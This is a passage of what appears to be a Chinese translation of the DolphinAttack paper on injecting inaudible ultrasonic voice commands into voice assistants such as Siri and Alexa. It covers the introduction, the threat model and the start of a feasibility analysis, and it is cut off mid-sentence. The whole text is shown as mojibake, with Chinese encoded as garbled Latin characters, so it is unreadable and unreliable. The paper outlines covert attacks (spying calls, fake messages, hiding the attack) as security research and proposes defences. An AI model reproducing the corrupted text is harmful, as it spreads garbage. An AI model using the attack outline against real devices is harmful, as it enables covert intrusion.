ä¸ºäº†å›ç­”è¿™äº›é—®é¢˜ï¼Œæˆ‘ä»¬è®¾è®¡äº†DolphinAttackï¼Œè¿™æ˜¯ä¸€ç§é€šè¿‡åˆ©ç”¨è¶…å£°é€šé“ï¼ˆå³f&gt; 20 kHzï¼‰å’ŒåŸºç¡€éŸ³é¢‘ç¡¬ä»¶çš„æ¼æ´åœ¨VCSå¤„æ³¨å…¥å¬ä¸è§çš„è¯­éŸ³å‘½ä»¤çš„æ–¹æ³•ã€‚ç”±äºä»¥ä¸‹ç–‘é—®ï¼Œå¬ä¸è§çš„è¯­éŸ³å‘½ä»¤ä¼¼ä¹ä¸å¯è¡Œã€‚ï¼ˆaï¼‰è®¾å¤‡å¦‚ä½•å¬åˆ°å¬ä¸åˆ°çš„å£°éŸ³ï¼Ÿäººç±»å£°éŸ³å’Œå¬åŠ›çš„ä¸Šé™é¢‘ç‡ä¸º20 kHzã€‚å› æ­¤ï¼Œå¤§å¤šæ•°å…·æœ‰éŸ³é¢‘åŠŸèƒ½çš„è®¾å¤‡ï¼ˆä¾‹å¦‚ç”µè¯ï¼‰é‡‡ç”¨ä½äº44 kHzçš„éŸ³é¢‘é‡‡æ ·ç‡ï¼Œå¹¶åº”ç”¨ä½é€šæ»¤æ³¢å™¨æ¥æ¶ˆé™¤é«˜äº20 kHzçš„ä¿¡å·[32]ã€‚å…ˆå‰çš„å·¥ä½œ[61]è®¤ä¸ºä¸å¯èƒ½æ¥æ”¶20 kHzä»¥ä¸Šçš„å£°éŸ³ã€‚ï¼ˆbï¼‰SRç³»ç»Ÿå¦‚ä½•ç†è§£å¬ä¸è§çš„å£°éŸ³ï¼Ÿå³ä½¿è¶…å£°è¢«ç¡¬ä»¶æ¥æ”¶å¹¶æ­£ç¡®é‡‡æ ·ï¼ŒSRç³»ç»Ÿä¹Ÿä¸ä¼šè¯†åˆ«ä¸äººçš„éŸ³è°ƒç‰¹å¾ä¸åŒ¹é…çš„ä¿¡å·ï¼Œå› æ­¤æ— æ³•è§£é‡Šå‘½ä»¤ã€‚ï¼ˆcï¼‰å¬ä¸è§çš„å£°éŸ³å¦‚ä½•å¯¼è‡´VCSå‘ç”Ÿæœªæ³¨æ„åˆ°çš„å®‰å…¨æ¼æ´ï¼Ÿæ§åˆ¶VCSçš„ç¬¬ä¸€æ­¥æ˜¯æ¿€æ´»å®ƒä»¬ã€‚è®¸å¤šVCSï¼ˆä¾‹å¦‚ï¼Œæ™ºèƒ½æ‰‹æœºå’Œæ™ºèƒ½å®¶å±…è®¾å¤‡ï¼‰å®ç°äº†å§‹ç»ˆåœ¨çº¿åŠŸèƒ½ï¼Œè¯¥åŠŸèƒ½å¯é€šè¿‡ä¾èµ–äºè¯´è¯è€…çš„å”¤é†’è¯æ¥æ¿€æ´»å®ƒä»¬ï¼Œå³ï¼Œæ­¤ç±»ç³»ç»Ÿåˆ©ç”¨è¯­éŸ³è¯†åˆ«æ¥è®¤è¯ç”¨æˆ·ã€‚éšæœºè¯­éŸ³å‘½ä»¤ä¸ä¼šé€šè¿‡è¯­éŸ³è¯†åˆ«ã€‚æˆ‘ä»¬è§£å†³äº†æ‰€æœ‰è¿™äº›é—®é¢˜ï¼Œå¹¶ä¸”æˆ‘ä»¬è¯æ˜äº†DolphinAttackè¯­éŸ³å‘½ä»¤è™½ç„¶å®Œå…¨å¬ä¸è§ï¼Œå› æ­¤å¯¹äºäººç±»æ¥è¯´æ˜¯å¬ä¸è§çš„ï¼Œä½†æ˜¯å®ƒä»¬å¯ä»¥è¢«è®¾å¤‡çš„éŸ³é¢‘ç¡¬ä»¶æ¥æ”¶ï¼Œå¹¶ä¸”å¯ä»¥è¢«è¯­éŸ³è¯†åˆ«ç³»ç»Ÿæ­£ç¡®ç†è§£ã€‚æˆ‘ä»¬åœ¨ä¸»è¦çš„è¯­éŸ³è¯†åˆ«ç³»ç»Ÿä¸ŠéªŒè¯äº†DolphinAttackï¼ŒåŒ…æ‹¬Siriï¼ŒGoogle Nowï¼Œä¸‰æ˜ŸS Voice [43]ï¼Œåä¸ºHiVoice [65]ï¼ŒCortana [37]å’ŒAlexaã€‚æ— æ³•å¬è§çš„è¯­éŸ³å‘½ä»¤è´¨ç–‘é€šç”¨è®¾è®¡å‡è®¾ï¼Œå³å¯¹æ‰‹æœ€å¤šåªèƒ½å°è¯•ä»¥è¯­éŸ³æ–¹å¼æ“çºµVCSï¼Œå¹¶ä¸”å¯ä»¥è¢«è­¦æŠ¥ç”¨æˆ·æ£€æµ‹åˆ°ã€‚ æ­¤å¤–ï¼Œæˆ‘ä»¬é€šè¿‡è¯¢é—®ä»¥ä¸‹å†…å®¹æ¥è¡¨å¾è¿™ç§å‡è®¾çš„å®‰å…¨åæœï¼šä¸€ç³»åˆ—å¬ä¸è§çš„è¯­éŸ³å‘½ä»¤å¯ä»¥åœ¨å¤šå¤§ç¨‹åº¦ä¸Šå±å®³VCSçš„å®‰å…¨æ€§ã€‚ ä¸ºäº†è¯´æ˜è¿™ä¸€ç‚¹ï¼Œæˆ‘ä»¬å±•ç¤ºäº†DolphinAttackå¯ä»¥å®Œå…¨é€šè¿‡ä¸€ç³»åˆ—å¬ä¸è§çš„è¯­éŸ³å‘½ä»¤æ¥å®ç°ä»¥ä¸‹å·å·æ‘¸æ‘¸çš„æ”»å‡»ï¼šï¼ˆ1ï¼‰è®¿é—®æ¶æ„ç½‘ç«™ã€‚ è¯¥è®¾å¤‡å¯ä»¥æ‰“å¼€ä¸€ä¸ªæ¶æ„ç½‘ç«™ï¼Œè¯¥ç½‘ç«™å¯ä»¥å‘èµ·æŒ‰ä¸‹è½½é©±åŠ¨å™¨æ”»å‡»æˆ–åˆ©ç”¨å…·æœ‰0å¤©æ¼æ´çš„è®¾å¤‡ã€‚ï¼ˆ2ï¼‰é—´è°ã€‚ æ”»å‡»è€…å¯ä»¥ä½¿å—å®³è®¾å¤‡å‘èµ·è§†é¢‘/ç”µè¯å‘¼å«ï¼Œå› æ­¤å¯ä»¥è®¿é—®è®¾å¤‡å‘¨å›´çš„å›¾åƒ/å£°éŸ³ã€‚ï¼ˆ3ï¼‰æ³¨å…¥è™šå‡ä¿¡æ¯ã€‚ æ”»å‡»è€…å¯ä»¥æŒ‡ç¤ºå—å®³è®¾å¤‡å‘é€è™šå‡çš„æ–‡æœ¬æ¶ˆæ¯å’Œç”µå­é‚®ä»¶ï¼Œå‘å¸ƒè™šå‡çš„åœ¨çº¿å¸–å­ï¼Œå‘æ—¥å†ä¸­æ·»åŠ è™šå‡çš„äº‹ä»¶ç­‰ã€‚ï¼ˆ4ï¼‰æ‹’ç»æœåŠ¡ã€‚ å¯¹æ‰‹å¯èƒ½ä¼šæ³¨å…¥å‘½ä»¤ä»¥å¼€å¯é£è¡Œæ¨¡å¼ï¼Œä»è€Œæ–­å¼€æ‰€æœ‰æ— çº¿é€šä¿¡ã€‚ï¼ˆ5ï¼‰éšè—æ”»å‡»ã€‚ å±å¹•æ˜¾ç¤ºå’Œè¯­éŸ³åé¦ˆå¯èƒ½ä¼šæš´éœ²æ”»å‡»ã€‚ å¯¹æ‰‹å¯ä»¥é€šè¿‡è°ƒæš—å±å¹•å’Œé™ä½éŸ³é‡æ¥é™ä½å¤±è´¥ç‡ã€‚æˆ‘ä»¬å·²ç»åœ¨16ç§VCSå‹å·ä¸Šæµ‹è¯•äº†è¿™äº›æ”»å‡»ï¼ŒåŒ…æ‹¬Apple iPhoneï¼ŒGoogle Nexusï¼ŒAmazon Echoå’Œæ±½è½¦ã€‚ æ¯æ¬¡æ”»å‡»è‡³å°‘åœ¨ä¸€ä¸ªSRç³»ç»Ÿä¸ŠæˆåŠŸã€‚ æˆ‘ä»¬è®¤ä¸ºè¯¥åˆ—è¡¨åˆ°ç›®å‰ä¸ºæ­¢è¿˜ä¸å¤Ÿå…¨é¢ã€‚ å°½ç®¡å¦‚æ­¤ï¼Œå®ƒè¿˜æ˜¯ä¸€ä¸ªé¢„è­¦ï¼Œå¯ä»¥é‡æ–°è€ƒè™‘åœ¨è¯­éŸ³å¯æ§ç³»ç»Ÿä¸­åº”æ”¯æŒå“ªäº›åŠŸèƒ½å’Œäººç±»äº¤äº’çº§åˆ«ã€‚æ€»è€Œè¨€ä¹‹ï¼Œæˆ‘ä»¬çš„è´¡çŒ®å¦‚ä¸‹ï¼šâ€¢æˆ‘ä»¬å±•ç¤ºäº†DolphinAttackï¼Œå®ƒå¯ä»¥åˆ©ç”¨æ— æ³•å¬è§çš„å£°éŸ³å’ŒéŸ³é¢‘ç”µè·¯çš„ç‰¹æ€§ï¼Œåœ¨æœ€å…ˆè¿›çš„è¯­éŸ³è¯†åˆ«ç³»ç»Ÿä¸­æ³¨å…¥éšè”½çš„è¯­éŸ³å‘½ä»¤ã€‚ æˆ‘ä»¬åœ¨16ä¸ªå¸¸è§çš„è¯­éŸ³å¯æ§ç³»ç»Ÿå¹³å°ä¸Šçš„7ç§æµè¡Œè¯­éŸ³è¯†åˆ«ç³»ç»Ÿï¼ˆä¾‹å¦‚Siriï¼ŒGoogle Nowï¼ŒAlexaï¼‰ä¸ŠéªŒè¯äº†DolphinAttackã€‚â€¢æˆ‘ä»¬è¯æ˜äº†å¯¹æ‰‹å¯ä»¥æ³¨å…¥ä¸€ç³»åˆ—å¬ä¸è§çš„è¯­éŸ³å‘½ä»¤æ¥æ¿€æ´»å§‹ç»ˆåœ¨çº¿çš„ç³»ç»Ÿå¹¶å®ç°å„ç§æ¶æ„æ”»å‡»ã€‚ ç»è¿‡æµ‹è¯•çš„æ”»å‡»åŒ…æ‹¬åœ¨iPhoneä¸Šå¯åŠ¨Facetimeï¼Œåœ¨Amazon Echoä¸Šæ’­æ”¾éŸ³ä¹ä»¥åŠæ“çºµå¥¥è¿ªæ±½è½¦ä¸­çš„å¯¼èˆªç³»ç»Ÿã€‚â€¢æˆ‘ä»¬å»ºè®®åŒæ—¶ä½¿ç”¨åŸºäºç¡¬ä»¶å’ŒåŸºäºè½¯ä»¶çš„é˜²å¾¡ç­–ç•¥æ¥å‡è½»æ”»å‡»ï¼Œå¹¶æä¾›å¢å¼ºè¯­éŸ³å¯æ§ç³»ç»Ÿå®‰å…¨æ€§çš„å»ºè®®ã€‚ 2 èƒŒæ™¯å’Œå¨èƒæ¨¡å‹åœ¨æœ¬èŠ‚ä¸­ï¼Œæˆ‘ä»¬ä»‹ç»æµè¡Œçš„è¯­éŸ³å¯æ§ç³»ç»Ÿï¼Œå¹¶ä»¥MEMSéº¦å…‹é£ä¸ºé‡ç‚¹è®¨è®ºå®ƒä»¬çš„ä½“ç³»ç»“æ„ã€‚ 2.1 è¯­éŸ³å¯æ§ç³»ç»ŸVCSä¸€ä¸ªå…¸å‹çš„è¯­éŸ³å¯æ§ç³»ç»Ÿç”±ä¸‰ä¸ªä¸»è¦å­ç³»ç»Ÿç»„æˆï¼šè¯­éŸ³æ•è·ï¼Œè¯­éŸ³è¯†åˆ«å’Œå‘½ä»¤æ‰§è¡Œï¼Œå¦‚å›¾1æ‰€ç¤ºã€‚è¯­éŸ³æ•è·å­ç³»ç»Ÿè®°å½•ç¯å¢ƒè¯­éŸ³ï¼Œè¿™äº›ç¯å¢ƒè¯­éŸ³åœ¨è¢«ä¼ é€’åˆ° è¯­éŸ³è¯†åˆ«å­ç³»ç»Ÿä¹‹å‰è¢«æ”¾å¤§ï¼Œè¿‡æ»¤å’Œæ•°å­—åŒ–ã€‚ç„¶åï¼Œé¦–å…ˆå¯¹åŸå§‹æ•è·çš„æ•°å­—ä¿¡å·è¿›è¡Œé¢„å¤„ç†ï¼Œä»¥å»é™¤è¶…å‡ºå£°éŸ³èŒƒå›´çš„é¢‘ç‡ï¼Œå¹¶ä¸¢å¼ƒåŒ…å«å£°éŸ³å¤ªå¼±è€Œæ— æ³•è¯†åˆ«çš„ä¿¡å·æ®µã€‚ æ¥ä¸‹æ¥ï¼Œå¤„ç†åçš„ä¿¡å·è¿›å…¥è¯­éŸ³è¯†åˆ«ç³»ç»Ÿã€‚é€šå¸¸ï¼Œè¯­éŸ³è¯†åˆ«ç³»ç»Ÿåœ¨ä¸¤ä¸ªé˜¶æ®µå·¥ä½œï¼šæ¿€æ´»å’Œè¯†åˆ«ã€‚åœ¨æ¿€æ´»é˜¶æ®µï¼Œç³»ç»Ÿæ— æ³•æ¥å—ä»»æ„è¯­éŸ³è¾“å…¥ï¼Œä½†ä¼šç­‰å¾…æ¿€æ´»ã€‚è¦æ¿€æ´»ç³»ç»Ÿï¼Œç”¨æˆ·å¿…é¡»è¯´å‡ºé¢„å®šä¹‰çš„å”¤é†’è¯æˆ–æŒ‰ç‰¹æ®Šé”®ã€‚ä¾‹å¦‚ï¼ŒAmazon echoå°†â€œ Alexaâ€ä½œä¸ºæ¿€æ´»å”¤é†’è¯ã€‚æŒ‰ä½ä¸»å±å¹•æŒ‰é’®çº¦ä¸€ç§’é’Ÿå¯ä»¥æ¿€æ´»Apple Siriï¼Œå¦‚æœå¯ç”¨äº†â€œ Allow Hey Siriâ€åŠŸèƒ½ï¼Œåˆ™å¯ä»¥é€šè¿‡â€œ Hey Siriâ€æ¿€æ´»ã€‚è¦è¯†åˆ«å”¤é†’è¯ï¼Œéº¦å…‹é£ä¼šç»§ç»­å½•åˆ¶ç¯å¢ƒå£°éŸ³ï¼Œç›´åˆ°å‘å‡ºå£°éŸ³ä¸ºæ­¢ã€‚ç„¶åï¼Œç³»ç»Ÿå°†ä½¿ç”¨ä¸è¯´è¯è€…æ— å…³æˆ–ä¸è¯´è¯è€…æ— å…³çš„è¯­éŸ³è¯†åˆ«ç®—æ³•æ¥è¯†åˆ«è¯­éŸ³ã€‚ä¾‹å¦‚ï¼Œåªè¦å£°éŸ³æ¸…æ™°ä¸”å“äº®ï¼ŒAmazon Echoå°±ä¼šé‡‡ç”¨ä¸è¯´è¯è€…æ— å…³çš„ç®—æ³•ï¼Œå¹¶æ¥å—ä»»ä½•äººè¯´çš„â€œ Alexaâ€ã€‚ç›¸æ¯”ä¹‹ä¸‹ï¼ŒApple Siriå–å†³äºæ‰¬å£°å™¨ã€‚ Siriéœ€è¦æ¥å—ç”¨æˆ·åŸ¹è®­ï¼Œå¹¶ä¸”ä»…æ¥å—åŒä¸€ä¸ªäººçš„â€œ Hey Siriâ€ã€‚æ¿€æ´»åï¼ŒSRç³»ç»Ÿå°†è¿›å…¥è¯†åˆ«é˜¶æ®µï¼Œé€šå¸¸å°†ä½¿ç”¨ä¸è¯´è¯è€…æ— å…³çš„ç®—æ³•å°†è¯­éŸ³è½¬æ¢ä¸ºæ–‡æœ¬ï¼Œå³æœ¬ä¾‹ä¸­çš„å‘½ä»¤ã€‚è¯·æ³¨æ„ï¼Œä¸è¯´è¯è€…ç›¸å…³çš„SRé€šå¸¸åœ¨æœ¬åœ°æ‰§è¡Œï¼Œä¸è¯´è¯è€…æ— å…³çš„SRé€šè¿‡äº‘æœåŠ¡æ‰§è¡Œ[28]ã€‚ è¦ä½¿ç”¨äº‘æœåŠ¡ï¼Œå·²å¤„ç†çš„ä¿¡å·å°†å‘é€åˆ°æœåŠ¡å™¨ï¼ŒæœåŠ¡å™¨å°†æå–ç‰¹å¾ï¼ˆé€šå¸¸ä¸ºMelé¢‘ç‡å€’è°±ç³»æ•°[10ã€27ã€62]ï¼‰å¹¶é€šè¿‡æœºå™¨å­¦ä¹ ç®—æ³•ï¼ˆä¾‹å¦‚ï¼Œéšé©¬å°”å¯å¤«æ¨¡å‹æˆ–ç¥ç»ç½‘ç»œï¼‰è¯†åˆ«å‘½ä»¤ ç½‘ç»œï¼‰ã€‚ æœ€åï¼Œå‘½ä»¤è¢«å‘å›ã€‚ç»™å®šå·²è¯†åˆ«çš„å‘½ä»¤ï¼Œå‘½ä»¤æ‰§è¡Œç³»ç»Ÿå°†å¯åŠ¨ç›¸åº”çš„åº”ç”¨ç¨‹åºæˆ–æ‰§è¡Œæ“ä½œã€‚ å¯æ¥å—çš„å‘½ä»¤å’Œç›¸åº”çš„åŠ¨ä½œå–å†³äºç³»ç»Ÿï¼Œå¹¶ä¸”æ˜¯é¢„å…ˆå®šä¹‰çš„ã€‚ æµè¡Œçš„è¯­éŸ³å¯æ§ç³»ç»ŸåŒ…æ‹¬æ™ºèƒ½æ‰‹æœºï¼Œå¯ç©¿æˆ´è®¾å¤‡ï¼Œæ™ºèƒ½å®¶å±…è®¾å¤‡å’Œæ±½è½¦ã€‚ æ™ºèƒ½æ‰‹æœºå…è®¸ç”¨æˆ·é€šè¿‡è¯­éŸ³å‘½ä»¤æ‰§è¡Œå¹¿æ³›çš„æ“ä½œï¼Œä¾‹å¦‚æ‹¨æ‰“ç”µè¯å·ç ï¼Œå‘é€çŸ­ä¿¡ï¼Œæ‰“å¼€ç½‘é¡µï¼Œå°†æ‰‹æœºè®¾ç½®ä¸ºé£è¡Œæ¨¡å¼ç­‰ã€‚ç°ä»£æ±½è½¦æ¥å—ä¸€ç³»åˆ—ç²¾å¿ƒè®¾è®¡çš„è¯­éŸ³å‘½ä»¤æ¥æ¿€æ´» å¹¶æ§åˆ¶ä¸€äº›è½¦è½½åŠŸèƒ½ï¼Œä¾‹å¦‚GPSï¼Œå¨±ä¹ç³»ç»Ÿï¼Œç¯å¢ƒæ§åˆ¶å’Œæ‰‹æœºã€‚ ä¾‹å¦‚ï¼Œå¦‚æœè¯†åˆ«å‡ºâ€œå‘¼å«1234567890â€ï¼Œåˆ™æ±½è½¦æˆ–æ™ºèƒ½æ‰‹æœºå¯èƒ½ä¼šå¼€å§‹æ‹¨æ‰“ç”µè¯å·ç 1234567890å…³äºè¯­éŸ³å¯æ§ç³»ç»Ÿçš„è®¸å¤šå®‰å…¨æ€§ç ”ç©¶éƒ½é›†ä¸­äºæ”»å‡»è¯­éŸ³è¯†åˆ«ç®—æ³•[10]æˆ–å‘½ä»¤æ‰§è¡Œç¯å¢ƒï¼ˆä¾‹å¦‚æ¶æ„è½¯ä»¶ï¼‰ã€‚ æœ¬æ–‡é’ˆå¯¹è¯­éŸ³æ•è·å­ç³»ç»Ÿï¼Œå°†åœ¨ä¸‹ä¸€éƒ¨åˆ†ä¸­å¯¹å…¶è¿›è¡Œè¯¦ç»†ä»‹ç»ã€‚ 2.2 éº¦å…‹é£è¯­éŸ³æ•è·å­ç³»ç»Ÿè®°å½•å¯å¬è§çš„å£°éŸ³ï¼Œå¹¶ä¸”ä¸»è¦æ˜¯éº¦å…‹é£ï¼Œå…¶æ˜¯å°†ç©ºæ°”ä¼ æ’­çš„å£°æ³¢ï¼ˆå³å£°éŸ³ï¼‰è½¬æ¢ä¸ºç”µä¿¡å·çš„æ¢èƒ½å™¨ã€‚æœ€å¤è€å’Œæœ€å—æ¬¢è¿çš„éº¦å…‹é£ä¹‹ä¸€æ˜¯ç”µå®¹å¼éº¦å…‹é£ï¼Œå®ƒé€šè¿‡å®¹é‡å˜åŒ–å°†å£°æ³¢è½¬æ¢ä¸ºç”µä¿¡å·ã€‚é©»æä½“ç”µå®¹å¼éº¦å…‹é£ï¼ˆECMï¼‰å’Œå¾®æœºç”µç³»ç»Ÿï¼ˆMEMSï¼‰[2ã€3ã€29ã€52ã€53]ç‰ˆæœ¬éƒ½å¯ä»¥åœ¨å¸‚åœºä¸Šè´­ä¹°ã€‚ç”±äºå¾®å‹å°è£…å°ºå¯¸å’Œä½åŠŸè€—ï¼ŒMEMSéº¦å…‹é£ä¸»å¯¼äº†è¯­éŸ³å¯æ§è®¾å¤‡ï¼ŒåŒ…æ‹¬æ™ºèƒ½æ‰‹æœºï¼Œå¯ç©¿æˆ´è®¾å¤‡ã€‚å› æ­¤ï¼Œæœ¬æ–‡ä¸»è¦å…³æ³¨MEMSéº¦å…‹é£ï¼Œå¹¶å°†ç®€è¦æŠ¥å‘Šæœ‰å…³ECMçš„ç»“æœã€‚ä¸è¿‡ï¼ŒMEMSå’ŒECMçš„å·¥ä½œåŸç†ç›¸ä¼¼ã€‚å¦‚å›¾2ï¼ˆbï¼‰æ‰€ç¤ºï¼ŒMEMSéº¦å…‹é£åŒ…å«è–„è†œï¼ˆå¯ç§»åŠ¨æ¿ï¼‰å’Œäº’è¡¥çš„å¸¦å­”èƒŒæ¿ï¼ˆå›ºå®šæ¿ï¼‰[54]ã€‚åœ¨å­˜åœ¨å£°æ³¢çš„æƒ…å†µä¸‹ï¼Œç”±å£°æ³¢å¼•èµ·çš„æ°”å‹ç©¿è¿‡èƒŒæ¿ä¸Šçš„å­”å¹¶åˆ°è¾¾éš”è†œï¼Œè¯¥éš”è†œæ˜¯ä¸€ç§è–„çš„å›ºä½“ç»“æ„ï¼Œå¯å“åº”æ°”å‹çš„å˜åŒ–è€Œå¼¯æ›²[64]ã€‚è¿™ç§æœºæ¢°å˜å½¢å¯¼è‡´ç”µå®¹å˜åŒ–ã€‚ç”±äºç”µå®¹å™¨ä¸Šä¿æŒå‡ ä¹æ’å®šçš„ç”µè·ï¼Œå› æ­¤ç”µå®¹å˜åŒ–å°†äº§ç”Ÿäº¤æµä¿¡å·ã€‚è¿™æ ·ï¼Œæ°”å‹è¢«è½¬æ¢æˆç”µä¿¡å·ä»¥è¿›è¡Œè¿›ä¸€æ­¥å¤„ç†ã€‚ç±»ä¼¼åœ°ï¼Œå¦‚å›¾2ï¼ˆaï¼‰æ‰€ç¤ºï¼ŒECMéº¦å…‹é£åˆ©ç”¨ç”±æŸ”æ€§è†œå’Œå›ºå®šæ¿å½¢æˆçš„ç”µå®¹æ¥è®°å½•å£°æ³¢ã€‚è¯­éŸ³æ•è·å­ç³»ç»Ÿä¸­çš„éº¦å…‹é£ï¼Œä½é€šæ»¤æ³¢å™¨ï¼ˆLPFï¼‰å’ŒADCæ—¨åœ¨æ•è·å¯å¬å£°éŸ³ï¼Œæ‰€æœ‰è¿™äº›åŠŸèƒ½éƒ½æ—¨åœ¨æŠ‘åˆ¶è¶…å‡ºå¯å¬å£°éŸ³é¢‘ç‡èŒƒå›´ï¼ˆå³20 Hzè‡³20 kHzï¼‰çš„ä¿¡å·ã€‚ æ ¹æ®æ•°æ®è¡¨ï¼Œéº¦å…‹é£çš„çµæ•åº¦é¢‘è°±åœ¨20 Hzè‡³20 kHzä¹‹é—´ï¼Œç†æƒ³æƒ…å†µä¸‹ï¼Œåº”è¿‡æ»¤ä»»ä½•å…¶ä»–é¢‘ç‡èŒƒå›´å†…çš„ä¿¡å·ã€‚ å³ä½¿éº¦å…‹é£è®°å½•äº†é«˜äº20 kHzçš„ä¿¡å·ï¼ŒLPFä¹Ÿåº”å°†å…¶åˆ é™¤ã€‚ æœ€åï¼ŒADCçš„é‡‡æ ·ç‡é€šå¸¸ä¸º44.1 kHzï¼Œæ ¹æ®å¥ˆå¥æ–¯ç‰¹é‡‡æ ·å®šç†ï¼Œæ•°å­—åŒ–ä¿¡å·çš„é¢‘ç‡è¢«é™åˆ¶åœ¨22 kHzä»¥ä¸‹ã€‚ 2.3 å¨èƒæ¨¡å‹æ”»å‡»è€…çš„ç›®æ ‡æ˜¯åœ¨ç”¨æˆ·ä¸çŸ¥æƒ…çš„æƒ…å†µä¸‹å°†è¯­éŸ³å‘½ä»¤æ³¨å…¥åˆ°è¯­éŸ³å¯æ§ç³»ç»Ÿä¸­ï¼Œå¹¶æ‰§è¡Œæœªç»èº«ä»½éªŒè¯çš„æ“ä½œã€‚æˆ‘ä»¬å‡è®¾å¯¹æ‰‹æ— æ³•ç›´æ¥è®¿é—®ç›®æ ‡è®¾å¤‡ï¼Œæ‹¥æœ‰è‡ªå·±çš„ä¼ è¾“å£°éŸ³ä¿¡å·çš„è®¾å¤‡ï¼Œå¹¶ä¸”æ— æ³•è¦æ±‚æ‰€æœ‰è€…æ‰§è¡Œä»»ä½•ä»»åŠ¡ã€‚ æ²¡æœ‰ç›®æ ‡è®¾å¤‡è®¿é—®æƒé™ã€‚æˆ‘ä»¬å‡è®¾å¯¹æ‰‹å¯ä»¥é’ˆå¯¹å¥¹é€‰æ‹©çš„ä»»ä½•è¯­éŸ³å¯æ§ç³»ç»Ÿï¼Œä½†å¥¹æ— æ³•ç›´æ¥è®¿é—®ç›®æ ‡è®¾å¤‡ã€‚å¥¹æ— æ³•å®é™…è§¦æ‘¸å®ƒä»¬ï¼Œæ›´æ”¹è®¾å¤‡è®¾ç½®æˆ–å®‰è£…æ¶æ„è½¯ä»¶ã€‚ä½†æ˜¯ï¼Œæˆ‘ä»¬å‡è®¾å¥¹å®Œå…¨äº†è§£ç›®æ ‡è®¾å¤‡çš„ç‰¹æ€§ã€‚å¯ä»¥é€šè¿‡é¦–å…ˆè·å–è®¾å¤‡æ¨¡å‹ï¼Œç„¶ååœ¨å‘èµ·æ”»å‡»ä¹‹å‰åˆ†æç›¸åŒæ¨¡å‹çš„è®¾å¤‡æ¥è·å¾—æ­¤ç±»çŸ¥è¯†ã€‚ æ²¡æœ‰æ‰€æœ‰è€…äº¤äº’ã€‚æˆ‘ä»¬å‡è®¾ç›®æ ‡è®¾å¤‡å¯èƒ½åœ¨æ‰€æœ‰è€…é™„è¿‘ï¼Œä½†å¯èƒ½æ²¡æœ‰åœ¨ä½¿ç”¨ä¸­å¹¶ä¸”ä¸å¼•èµ·æ³¨æ„ï¼ˆä¾‹å¦‚ï¼Œåœ¨æ¡Œå­çš„å¦ä¸€ä¾§ï¼Œå±å¹•é®ç›–çš„åœ°æ–¹æˆ–æ”¾åœ¨å£è¢‹ä¸­ï¼‰ã€‚æ­¤å¤–ï¼Œè®¾å¤‡å¯èƒ½æ— äººçœ‹ç®¡ï¼Œè¿™å¯èƒ½åœ¨æ‰€æœ‰è€…æš‚æ—¶ä¸åœ¨æ—¶ï¼ˆä¾‹å¦‚ï¼Œå°†Amazon Echoç•™åœ¨æˆ¿é—´ä¸­ï¼‰å‘ç”Ÿã€‚æˆ–è€…ï¼Œè®¾å¤‡å¯èƒ½è¢«ç›—ï¼Œå¯¹æ‰‹å¯èƒ½ä¼šå°è¯•å„ç§å¯èƒ½çš„æ–¹æ³•æ¥è§£é”å±å¹•ã€‚ä½†æ˜¯ï¼Œå¯¹æ‰‹ä¸èƒ½è¦æ±‚æ‰€æœ‰è€…æ‰§è¡Œä»»ä½•æ“ä½œï¼Œä¾‹å¦‚æŒ‰ä¸‹æŒ‰é’®æˆ–è§£é”å±å¹•ã€‚ å¬ä¸è§ã€‚ç”±äºå¯¹æ‰‹çš„ç›®æ ‡æ˜¯åœ¨ä¸è¢«æ£€æµ‹åˆ°çš„æƒ…å†µä¸‹æ³¨å…¥è¯­éŸ³å‘½ä»¤ï¼Œå› æ­¤å¥¹å°†ä½¿ç”¨äººç±»å¬ä¸åˆ°çš„å£°éŸ³ï¼Œå³è¶…å£°æ³¢ï¼ˆf&gt; 20 kHzï¼‰ã€‚è¯·æ³¨æ„ï¼Œæˆ‘ä»¬æ²¡æœ‰ä½¿ç”¨é«˜é¢‘å£°éŸ³ï¼ˆ18 kHz &lt;f &lt;20 kHzï¼‰ï¼Œå› ä¸ºå®ƒä»¬ä»ç„¶å¯ä»¥è¢«å­©å­å¬åˆ°ã€‚ æ”»å‡»è£…å¤‡ã€‚æˆ‘ä»¬å‡è®¾å¯¹æ‰‹æ—¢å¯ä»¥è·å–ç”¨äºå‘å°„è¶…å£°æ³¢çš„æ‰¬å£°å™¨ï¼Œä¹Ÿå¯ä»¥è·å–ç”¨äºæ’­æ”¾å£°éŸ³çš„å•†å“è®¾å¤‡ã€‚æ”»å‡»è€…åœ¨ç›®æ ‡è®¾å¤‡é™„è¿‘ã€‚ä¾‹å¦‚ï¼Œå¥¹å¯èƒ½ä¼šåœ¨å—å®³äººçš„æ¡Œå­æˆ–å®¶é™„è¿‘ç§˜å¯†åœ°ç•™ä¸‹ä¸€ä¸ªå¯è¿œç¨‹æ§åˆ¶çš„æ‰¬å£°å™¨ã€‚æˆ–è€…ï¼Œå¥¹å¯èƒ½åœ¨å—å®³è€…èµ°åŠ¨æ—¶æºå¸¦ä¾¿æºå¼æ‰¬å£°å™¨ã€‚ 3 å¯è¡Œæ€§åˆ†æDolphinAttackçš„åŸºæœ¬æ€æƒ³æ˜¯ï¼ˆaï¼‰åœ¨ç©ºä¸­ä¼ è¾“ä¹‹å‰åœ¨è¶…å£°è½½æ³¢ä¸Šè°ƒåˆ¶ä½é¢‘è¯­éŸ³ä¿¡å·ï¼ˆå³åŸºå¸¦ï¼‰ï¼Œä»¥åŠï¼ˆbï¼‰åœ¨æ¥æ”¶å™¨å¤„ç”¨è¯­éŸ³æ•è·ç¡¬ä»¶å¯¹è°ƒåˆ¶åçš„è¯­éŸ³ä¿¡å·è¿›è¡Œè§£è°ƒã€‚ç”±äºæˆ‘ä»¬æ— æ³•æ§åˆ¶è¯­éŸ³æ•è·ç¡¬ä»¶ï¼Œå› æ­¤æˆ‘ä»¬å¿…é¡»ä»¥ä¸€ç§å¯ä»¥ä½¿ç”¨è¯­éŸ³æ•è·ç¡¬ä»¶å°†å…¶è§£è°ƒä¸ºåŸºå¸¦ä¿¡å·çš„æ–¹å¼æ¥è°ƒåˆ¶ä¿¡å·ã€‚å‡è®¾éº¦å…‹é£æ¨¡å—å§‹ç»ˆåˆ©ç”¨LPFæŠ‘åˆ¶ä¸æƒ³è¦çš„é«˜é¢‘ä¿¡å·ï¼Œåˆ™è§£è°ƒåº”åœ¨LPFä¹‹å‰å®Œæˆã€‚ç”±äºè¯­éŸ³æ•è·ç¡¬ä»¶çš„ä¿¡å·è·¯å¾„ä»éº¦å…‹é£ï¼Œä¸€ä¸ªæˆ–å¤šä¸ªæ”¾å¤§å™¨LPFåˆ°ADCå¼€å§‹ï¼Œå› 